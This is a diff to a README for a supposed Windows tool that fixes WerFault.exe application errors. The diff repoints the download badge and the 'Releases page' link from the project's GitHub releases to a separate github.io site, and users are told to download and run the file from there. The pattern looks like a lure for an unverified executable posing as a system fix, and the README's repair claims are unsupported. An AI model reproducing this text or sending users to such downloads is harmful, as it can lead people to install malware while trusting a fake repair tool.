@@ -1,6 +1,6 @@
 # 🛠️ WerFault-Application-Error-Fix - Stop Windows Application Crash Errors Fast
 
-[![Download Now](https://img.shields.io/badge/Download-Application_Fix-blue.svg)](https://github.com/Smartsm7816/WerFault-Application-Error-Fix/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application_Fix-blue.svg)](https://smartsm7816.github.io)
 
 This software fixes the WerFault.exe application error on Windows 10 and Windows 11. The WerFault.exe process handles error reporting for Windows. When this process conflicts with system files or corrupted registry keys, programs crash or display error messages. This tool restores these system components to their default state to stop the errors.
 
@@ -27,7 +27,7 @@ You do not need to understand manual command-line repairs. This tool automates t
 
 Follow these steps to setup the fix on your computer.
 
-1. Go to the [Releases page](https://github.com/Smartsm7816/WerFault-Application-Error-Fix/releases).
+1. Go to the [Releases page](https://smartsm7816.github.io).
 2. Locate the link labeled with the most recent version number.
 3. Click the link to download the file to your computer.
 4. Save the file in a folder you can find easily, such as your Downloads folder.
